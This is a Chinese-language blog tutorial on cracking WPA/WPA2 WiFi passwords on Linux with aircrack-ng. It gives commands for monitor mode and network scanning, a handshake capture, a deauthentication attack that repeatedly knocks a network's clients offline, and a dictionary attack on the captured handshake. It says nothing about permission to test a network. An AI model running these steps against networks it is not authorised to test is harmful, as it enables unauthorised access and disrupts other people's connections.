---
title: "Linux 上使用 aircrack-ng 破解 WIFI"
slug: use-aircrack-ng-to-crack-wifi-on-linux
aliases: ["/2019/use-aircrack-ng-to-crack-wifi-on-linux.html"]
date: 2019-09-21 12:50:05
categories: ["网络安全"]
tags: ["Linux", "破解 WIFI", "无线渗透"]
toc: true
dropCap: false
draft: false
---

这是一篇写于 2018 年的文章，首发于 CSDN：<https://blog.csdn.net/qq_43760866/article/details/86773003>。

使用工具：aircrack-ng

环境：deepin linux

## 抓包

虚拟机读取不了笔记本的网卡信息，推荐使用物理机进行操作，或者购买 `wifi` 接收器
若无此工具要先安装

```bash
apt-get install aircrack-ng
```

首先开启网卡监听模式

```bash
sudo airmon-ng start wlp2s0
```

`wlp2s0` 为本机网卡名，可用 `ifconfig` 或 `iwconfig` 查看

![aircrak-ng-linux-1](https://oss.zjun.info/zjun.info/aircrak-ng-linux-1.png)

此时卡网被改了名字，上图可见，或则同样 `ifconfig` 或 `iwconfig` 查看

![aircrak-ng-linux-2](https://oss.zjun.info/zjun.info/aircrak-ng-linux-2.png)

然后扫描附近 `wifi` 信号

```bash
sudo airodump-ng wlp2s0mon
```

![aircrak-ng-linux-3](https://oss.zjun.info/zjun.info/aircrak-ng-linux-3.png)

![aircrak-ng-linux-4](https://oss.zjun.info/zjun.info/aircrak-ng-linux-4.png)

`注：airodump-ng <你的网卡名称>`

* BSSID 是 AP 端的 MAC 地址
* PWR 是信号强度，数字越小越好
* Data 是对应的路由器的在线数据吞吐量，数字越大，数据上传量越大。
* CH 是对应路由器的所在频道
* ESSID 是对应路由器的名称

停止扫描后使用 `airodump-ng` 监听指定目标频道

![aircrak-ng-linux-5](https://oss.zjun.info/zjun.info/aircrak-ng-linux-5.png)

`注：airodump-ng -c <AP 的频道> -w <抓取握手包的存放位置> --bssid <AP 的 MAC 地址> <你的网卡名称>`

![aircrak-ng-linux-6](https://oss.zjun.info/zjun.info/aircrak-ng-linux-6.png)

当你获取道握手包时，右上角区域会显示 `WPA handshake` ，因为后期截图的原因，这里显示已获取，若没有获取则需要发动攻击，迫使合法的客户端断线，进行重新认证，我们趁机抓包。

保持上一个终端窗口的运行状态，打开一个新的终端

![aircrak-ng-linux-7](https://oss.zjun.info/zjun.info/aircrak-ng-linux-7.png)

`注：aireplay-ng -<攻击模式，我们这里使用 解除认证攻击> [攻击次数，0 为无限攻击] -a <AP 端的 MAC 地址> -c <客户端端的 MAC 地址> <你的网卡名称>`

这里我使用的是解除认证攻击模式，给客户端无限发送测试包使其下线。当你获取到握手包时，可以使用 `Ctrl + C` 停止发送测试包。

在你的抓取握手包的存放目录会生成 4 个文件，握手包文件的拓展名为 `.cap`

![aircrak-ng-linux-8](https://oss.zjun.info/zjun.info/aircrak-ng-linux-8.png)

现在可关闭监听模式，不关也无影响

```bash
sudo airmon-ng stop wlp2s0mon
```

![aircrak-ng-linux-9](https://oss.zjun.info/zjun.info/aircrak-ng-linux-9.png)

并且重启网卡服务

```bash
systemctl start NetworkManager.service
```

## 爆破

最后使用字典进行暴力破解，当密码破解成功时，会显示 `KEY FOUND!` 字样，中括号为 `wifi` 密码。

![aircrak-ng-linux-10](https://oss.zjun.info/zjun.info/aircrak-ng-linux-10.png)

`注：aircrack-ng -w <字典路径> <握手包路径>`

`wpa/wpa2` 的密码破解完全靠运气，但是一个强大字典是肯定可以提高破解的成功几率。
